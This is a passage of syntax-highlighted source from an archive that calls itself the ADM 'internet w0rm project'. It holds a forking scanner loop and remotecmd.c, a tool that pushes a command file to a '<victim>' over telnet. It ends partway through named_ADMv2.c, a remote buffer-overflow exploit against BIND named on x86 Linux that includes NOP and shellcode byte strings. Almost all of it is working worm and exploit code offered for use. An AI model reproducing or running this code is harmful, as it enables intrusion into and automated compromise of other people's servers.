            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">childs</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">MAXCHILD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">wait</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fork</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">checkout</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"fork"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">exit</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">childs</span><span class="sc10">++;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">childs</span><span class="sc10">--)</span><span class="sc0"> </span><span class="sc11">wait</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">remotecmd</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0"></span><span class="sc4">100644</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">       </span><span class="sc4">10002</span><span class="sc0">  </span><span class="sc4">6522332004</span><span class="sc0">  </span><span class="sc4">12152</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0"></span><span class="sc3">/***************************************/</span><span class="sc0">
</span><span class="sc1">/* remotecmd.c (c) ADM                 */</span><span class="sc0">
</span><span class="sc1">/* do a non interactive telnet session */</span><span class="sc0">
</span><span class="sc1">/* -==* ADM internet w0rm project *==- */</span><span class="sc0">
</span><span class="sc3">/***************************************/</span><span class="sc0">

</span><span class="sc3">/**************************************************/</span><span class="sc0">
</span><span class="sc1">/* usage: remotecmd &lt;victim&gt; [filename] [time]    */</span><span class="sc0">
</span><span class="sc1">/* &lt;victim&gt;   : heheh The Victim ~!#!@ :)         */</span><span class="sc0">
</span><span class="sc1">/* [filename] : per default the file with the cmd */</span><span class="sc0">
</span><span class="sc1">/*              is "./cmd" u can change it :)     */</span><span class="sc0">
</span><span class="sc1">/* [time]     : time to sleep bitwin the cmd      */</span><span class="sc0">
</span><span class="sc1">/*              (in microseconds)                 */</span><span class="sc0">
</span><span class="sc3">/**************************************************/</span><span class="sc0">


</span><span class="sc3">/********** cmd file example  **********/</span><span class="sc0">
</span><span class="sc1">/*
   ** $ cat &gt; cmd
   ** pooruser
   ** poorpasswd
   ** touch /tmp/netg_sistah_is_mine
   ** logout
   ** [Ctrl^D]
   ** $
 */</span><span class="sc0">
</span><span class="sc1">/* fun isnt it ? :pp */</span><span class="sc0">

</span><span class="sc1">/* The Infamous Define !! */</span><span class="sc0">

</span><span class="sc9">#define VERSION          "ADM remote commander 1.0 pub (c) ADM"
#define PROJECT          "ADM internet w0rm project"
#define OFFICIAL_ADM_GAL "Netguru Sister!$#"
#define LOVE              OFFICIAL_ADM_GAL
#define THINGS            "i lost my time #%$!#%"
#define SOMETHING         "Mais je l'aime steu CONNE!!"
</span><span class="sc0">

</span><span class="sc1">/* hehe the include is not so bad %-) */</span><span class="sc0">
</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size_t</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">bzero</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">usleep</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">usec</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">dacmd</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">usage</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">strcpy</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dest</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">src</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ADMtelnet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">u_long</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">host2ip</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">FILE_CMD_NAME</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"cmd"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">TIMEMETHAT</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">500000</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">main</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">argv</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc1">/* bla */</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">usage</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FILE_CMD_NAME</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">TIMEMETHAT</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]);</span><span class="sc0">

  </span><span class="sc11">ADMtelnet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host2ip</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]));</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> 
</span><span class="sc11">usage</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">c</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"-==* The ADM CreW *==-\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"usage  :%s &lt;victim&gt; [filename] [time in microsecond]\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"example: remotecmd www.h0h0.com ~root/cmdfile 500000\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*** filename per default is cmd ***\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*** time per defaulf is 500000 *** \n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0">
</span><span class="sc11">host2ip</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">serv</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sinn</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hent</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">hent</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyname</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">serv</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hent</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">bzero</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sinn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sinn</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">memcpy</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sinn</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hent</span><span class="sc10">-&gt;</span><span class="sc11">h_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hent</span><span class="sc10">-&gt;</span><span class="sc11">h_length</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sinn</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* diz function read the cmd from a file */</span><span class="sc0">
</span><span class="sc1">/* and he sent it over the socket        */</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">dacmd</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filez</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">255</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">bzero</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">filez</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"r"</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">feof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filez</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">fgets</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">filez</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">":%s&lt;"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc11">usleep</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TIMEMETHAT</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">bzero</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*  make a telnet connection */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">ADMtelnet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">4000</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dasock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">longueur</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc10">);</span><span class="sc0">


  </span><span class="sc11">dasock</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IPPROTO_TCP</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc1">/* gimme a socket */</span><span class="sc0">

  </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">23</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dasock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">longueur</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">));</span><span class="sc0">

      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dasock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">read</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dasock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc4">253</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!(</span><span class="sc11">u_char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">u_char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc4">253</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc10">*(</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">252</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dasock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">bzero</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">));</span><span class="sc0">
          </span><span class="sc11">read</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dasock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">));</span><span class="sc0">
          </span><span class="sc11">dacmd</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dasock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_CMD_NAME</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">sleep</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">named_ADMv2</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0"></span><span class="sc4">100644</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">       </span><span class="sc4">13404</span><span class="sc0">  </span><span class="sc4">6526321722</span><span class="sc0">  </span><span class="sc4">12232</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0"></span><span class="sc1">/*
   ___      ______      _       _
   /     \   |   _   \   |  \   /  |
   |  / \  |  |  |  \  |  |   \_/   |
   | |___| |  |  |_ /  |  |   \_/   |
   ..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
   '''   '''   '''''''    ''''   ''''        
   presents
   named remote overflow sploits
   x86    linux       

   ps: we are not the first guyz who have write the sploits but like nobody
   wanna give it to us we've make our own sploit ;) *celebrate*! :)

   ripped a lot from the vuln test proggies of 
   Joshua J. Drake (jdrake@pulsar.net)
   thx to him :)
 */</span><span class="sc0">


</span><span class="sc9">#define NOP 0x90
</span><span class="sc0">
</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;time.h&gt;
#include &lt;string.h&gt;
#include &lt;ctype.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;arpa/nameser.h&gt;
#include &lt;netdb.h&gt;
#include &lt;getopt.h&gt;
</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">handle_alarm</span><span class="sc0"> </span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">lookup_host</span><span class="sc0"> </span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">attack_bind</span><span class="sc0"> </span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">make_keypkt</span><span class="sc0"> </span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">send_packet</span><span class="sc0"> </span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">usage</span><span class="sc0"> </span><span class="sc10">();</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">10000</span><span class="sc10">];</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">basecode1</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\x5e\x31\xc0\xb0"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">basecode2</span><span class="sc10">[</span><span class="sc4">500</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\x89\xf7\x29\xc7\x89\xf3\x89"</span><span class="sc0">
</span><span class="sc6">"\xf9\x89\xf2\xac\x3c\xfe\x74\x10\xfe\xc0\x75\xf7\x88\x46\xff\x89\x17\x89"</span><span class="sc0">
